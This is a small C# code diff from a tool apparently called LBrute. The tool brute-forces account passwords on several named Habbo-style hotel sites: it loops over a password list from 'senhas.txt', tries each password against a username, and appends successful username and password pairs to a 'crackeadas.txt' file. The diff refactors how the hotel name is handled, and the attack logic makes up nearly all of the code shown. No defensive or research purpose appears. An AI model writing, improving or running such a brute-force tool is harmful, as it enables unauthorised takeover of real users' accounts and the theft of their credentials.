@@ -46,7 +46,7 @@ namespace LBrute
                 if (body.Contains(username))
                 {
                     crackeadas++;
-                    File.AppendAllText("crackeadas.txt", $"[{hotel.First().ToString().ToUpper()}{hotel.Substring(1)}] - Usuário: {username} - Senha: {password}\n");
+                    File.AppendAllText("crackeadas.txt", $"[{hotel}] - Usuário: {username} - Senha: {password}\n");
                 }
                 else 
                     invalidas++;
@@ -94,16 +94,16 @@ namespace LBrute
         }
 
         private static void InitBrute(string username){
-            hotel = hotel.ToLower();
+            string hotel_ = hotel.ToLower();
 
             foreach (var password in File.ReadAllLines("senhas.txt")) {
 
                 if (!executando) return;
 
-                if (hotel == "habblive") Habblive(username, password);
-                else if (hotel == "iron") Iron(username, password);
-                else if (hotel == "habbok") Habbok(username, password);
-                else if (hotel == "lella") Lella(username, password);
+                if (hotel_ == "habblive") Habblive(username, password);
+                else if (hotel_ == "iron") Iron(username, password);
+                else if (hotel_ == "habbok") Habbok(username, password);
+                else if (hotel_ == "lella") Lella(username, password);
 
             }
         }
